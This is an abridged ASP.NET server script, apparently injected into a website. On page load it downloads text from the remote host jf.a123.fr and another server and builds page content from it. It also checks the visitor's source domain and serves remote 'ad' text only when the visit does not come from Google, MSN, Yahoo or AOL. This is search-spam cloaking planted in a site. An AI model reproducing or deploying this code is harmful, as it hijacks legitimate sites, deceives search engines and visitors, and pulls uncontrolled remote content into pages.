...
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            ...
            string ggf = new string[] { "http://jf.a123.fr/new/es/ad-es-01.txt", "http://jf.a123.fr/new/es/ad-es-01.txt", "http://jf.a123.fr/new/es/ad-es-01.txt", "http://jf.a123.fr/new/es/ad-es-01.txt" }[new Random(unchecked((int)DateTime.Now.Ticks)).Next(0, 3)];
            ...
            {
                URL = hyzhdy + "/JDN_JF.aspx?gj=es&hl=es&xi=1-5&xc=12-19&txt=" + ggf + "&page=" + pname;
                content = webclient.DownloadString(URL);
            }
    ...
    public void tz()
    {
        ...
        if (domain.IndexOf("google") == -1 && domain.IndexOf("msn.com") == -1 && domain.IndexOf("yahoo.com") == -1 && domain.IndexOf("aol.com") == -1)
        {
            if (Request.QueryString["shop"] != null)
            {
                ...
                ccc = ccc.Replace(" ", "-");
                ccc = ccc.Replace("--", "-");
                string ddd = webclient.DownloadString("http://jf.a123.fr/es-ad.txt");
